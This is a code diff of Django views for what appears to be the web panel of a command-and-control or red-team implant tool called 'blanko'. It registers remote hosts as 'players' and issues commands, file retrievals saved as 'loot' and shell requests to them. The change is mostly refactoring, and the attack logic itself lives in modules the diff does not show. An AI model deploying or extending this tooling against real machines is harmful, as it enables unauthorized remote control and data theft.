@@ -11,11 +11,10 @@ from django.utils import timezone
 from django.views.decorators.http import require_GET, require_POST, require_http_methods
 
 from blanko.controller.commands import cmd_exec, cmd_get, cmd_ping, cmd_shell
+from swackhammer.utils import save_loot
 
 from .models import BlankoPlay, BlankoPlayer
-
 from .utils import available_kernels, configure_blanko_installer
-# from .utils import get_prize, new_prize
 
 
 @require_GET
@@ -39,38 +38,6 @@ def stats(request, player_id):
             "plays": player.blankoplay_set.order_by("-play_time"),
         },
     )
-
-
-@require_http_methods(["GET", "POST"])
-@login_required(login_url="/signin/", redirect_field_name=None)
-def hire(request):
-    template_data = {
-        "hostname": "",
-        "address": "",
-        "kernel": "",
-        "kernel_vers": available_kernels(),
-    }
-    if request.method == "GET":
-        return render(request, "blanko/hire.html", template_data)
-    try:
-        hostname = request.POST["hostname"]
-        address = request.POST["address"]
-        kernel = request.POST["kernel"]
-    except KeyError:
-        return render(request, "blanko/hire.html")
-    template_data.update({k: v for k, v in request.POST.items() if k in template_data})
-        
-    if not all((hostname, address, kernel)):
-        template_data["error_msg"] = "Missing configuration data!"
-        return render(request, "blanko/hire.html", template_data, status=400)
-    try:
-        player = BlankoPlayer.objects.create(
-            hostname=hostname, address=address, kernel=kernel, birthday=timezone.now()
-        )
-        return HttpResponseRedirect(reverse("blankoindex"))
-    except:
-        template_data["error_msg"] = "Configuration failed!"
-        return render(request, "blanko/hire.html", template_data, status=500)
 
 
 @require_http_methods(["GET", "POST"])
@@ -107,12 +74,44 @@ def config(request):
         return render(request, "blanko/config.html", template_data, status=500)
 
 
+@require_http_methods(["GET", "POST"])
+@login_required(login_url="/signin/", redirect_field_name=None)
+def hire(request):
+    template_data = {
+        "hostname": "",
+        "address": "",
+        "kernel": "",
+        "kernel_vers": available_kernels(),
+    }
+    if request.method == "GET":
+        return render(request, "blanko/hire.html", template_data)
+    try:
+        hostname = request.POST["hostname"]
+        address = request.POST["address"]
+        kernel = request.POST["kernel"]
+    except KeyError:
+        return render(request, "blanko/hire.html")
+    template_data.update({k: v for k, v in request.POST.items() if k in template_data})
+        
+    if not all((hostname, address, kernel)):
+        template_data["error_msg"] = "Missing configuration data!"
+        return render(request, "blanko/hire.html", template_data, status=400)
+    try:
+        player = BlankoPlayer.objects.create(
+            hostname=hostname, address=address, kernel=kernel, birthday=timezone.now()
+        )
+        return HttpResponseRedirect(reverse("blanko"))
+    except:
+        template_data["error_msg"] = "Configuration failed!"
+        return render(request, "blanko/hire.html", template_data, status=500)
+
+
 @require_POST
 @login_required(login_url="/signin/", redirect_field_name=None)
 def fire(request, player_id):
     player = get_object_or_404(BlankoPlayer, pk=player_id)
     player.delete()
-    return HttpResponseRedirect(reverse("blankoindex"))
+    return HttpResponseRedirect(reverse("blanko"))
 
 
 @require_http_methods(["GET", "POST"])
@@ -153,13 +152,11 @@ def makeplay(request, player_id):
             if retcode != 0:
                 play.penalty = str(retcode)
             if len(output.strip()):
-                dest, uri = new_prize("stdout.txt")
-                with open(dest, "w") as f:
-                    f.write(output)
+                uri = save_loot("stdout.txt", output, "blanko/")
                 play.filepath = uri
         elif play_verb == "GET":
-            dest, uri = new_prize(os.path.basename(detail))
-            do_get(player.address, dest_port, listen_port, detail, dest)
+            filedata = cmd_get(player.address, dest_port, listen_port, detail)
+            uri = save_loot(os.path.basename(detail), filedata, "blanko/")
             play.filepath = uri
         elif play_verb == "SHELL":
             ip, port = detail.rsplit(":")
@@ -179,22 +176,3 @@ def makeplay(request, player_id):
     play.save()
     player.save()
     return HttpResponseRedirect(reverse("stats", args=(player_id,)))
-
-
-@require_GET
-@login_required(login_url="/signin/", redirect_field_name=None)
-def prize(request, prize_id):
-    try:
-        path = get_prize(str(prize_id))
-        filename = os.path.basename(path)
-        with open(path, "rb") as f:
-            file_data = f.read()
-        if filename.endswith(".txt") or filename in TREAT_AS_TXT_FILES:
-            content_type = "text/plain"
-        else:
-            content_type = "application/octet-stream"
-        response = HttpResponse(file_data, content_type=content_type)
-        response["Content-Disposition"] = f"inline; filename={filename}"
-        return response
-    except Exception as err:
-        return HttpResponseNotFound()
